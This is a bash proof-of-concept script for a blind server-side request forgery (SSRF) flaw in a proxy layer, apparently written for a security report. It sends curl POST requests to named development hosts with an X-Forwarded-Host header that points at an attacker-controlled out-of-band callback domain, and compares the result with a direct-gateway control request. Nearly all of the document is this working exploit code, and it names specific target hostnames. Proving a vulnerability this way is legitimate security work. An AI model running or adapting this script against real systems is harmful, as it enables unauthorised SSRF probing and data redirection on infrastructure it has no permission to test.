#!/usr/bin/env bash
# PoC: Blind SSRF via X-Forwarded-Host on KMSAT OD proxy layer
#
# Proves that the KMSAT infrastructure (not the EAI handler) follows
# the X-Forwarded-Host header value, causing the server to redirect
# the response to an attacker-controlled host.
#
# The same request sent to the direct API Gateway URL does NOT trigger
# the SSRF, confirming the issue is in the KMSAT proxy/routing layer.
#
# Prerequisites:
#   - An OOB callback domain (e.g. https://app.interactsh.com or Burp Collaborator)
#   - Replace OOB_DOMAIN below with your callback domain
#
# Usage:
#   ./poc_ssrf_xforwardedhost.sh

OOB_DOMAIN="${OOB_DOMAIN:-YOUR_OOB_DOMAIN.oast.site}"
KMSAT_HOST="od-for-rahul-only.kmsat.kb4od.run"
DIRECT_HOST="eai-agent-security-agent-inventory-od-for-rahul-only.ai-dev.kb4od.run"

echo "============================================"
echo "PoC: Blind SSRF via X-Forwarded-Host"
echo "OOB domain: ${OOB_DOMAIN}"
echo "============================================"
echo ""

# --- Test 1: KMSAT OD path (vulnerable) ---
echo "[TEST 1] KMSAT OD path: https://${KMSAT_HOST}/extension/auth/token"
echo "  Injecting X-Forwarded-Host: ssrf-poc.${OOB_DOMAIN}"
echo ""

RESP1=$(curl -s -o /dev/null -w "HTTP %{http_code} | Redirect: %{redirect_url} | Final: %{url_effective}" \
  -X POST "https://${KMSAT_HOST}/extension/auth/token" \
  -H "Content-Type: application/json" \
  -H "X-Forwarded-Host: ssrf-poc.${OOB_DOMAIN}" \
  -d '{"integration_id":"test","os_type":"windows","browser":"chrome","browser_profile_email":"test@example.com","machine_token":"test"}' \
  -L --max-redirs 3 2>/dev/null)

echo "  Result: ${RESP1}"
echo ""

# --- Test 2: Direct API Gateway path (not vulnerable) ---
echo "[TEST 2] Direct APIGW: https://${DIRECT_HOST}/extension/auth/token"
echo "  Injecting X-Forwarded-Host: ssrf-poc-direct.${OOB_DOMAIN}"
echo ""

RESP2=$(curl -s -w "\n  HTTP %{http_code}" \
  -X POST "https://${DIRECT_HOST}/extension/auth/token" \
  -H "Content-Type: application/json" \
  -H "X-Forwarded-Host: ssrf-poc-direct.${OOB_DOMAIN}" \
  -d '{"integration_id":"test","os_type":"windows","browser":"chrome","browser_profile_email":"test@example.com","machine_token":"test"}')

echo "  Result: ${RESP2}"
echo ""

echo "============================================"
echo "Check your OOB listener for callbacks."
echo ""
echo "Expected:"
echo "  - TEST 1 (KMSAT OD): DNS + HTTP callbacks from the server"
echo "    to ssrf-poc.${OOB_DOMAIN}. The server redirects the"
echo "    entire response to the attacker-controlled host."
echo "  - TEST 2 (Direct APIGW): 401 JSON with no OOB callbacks."
echo "    The handler rejects with 'No corresponding integration'"
echo "    and never processes X-Forwarded-Host."
echo ""
echo "Conclusion: The SSRF is in the KMSAT proxy/routing layer,"
echo "not in the EAI extension handler code."
echo "============================================"
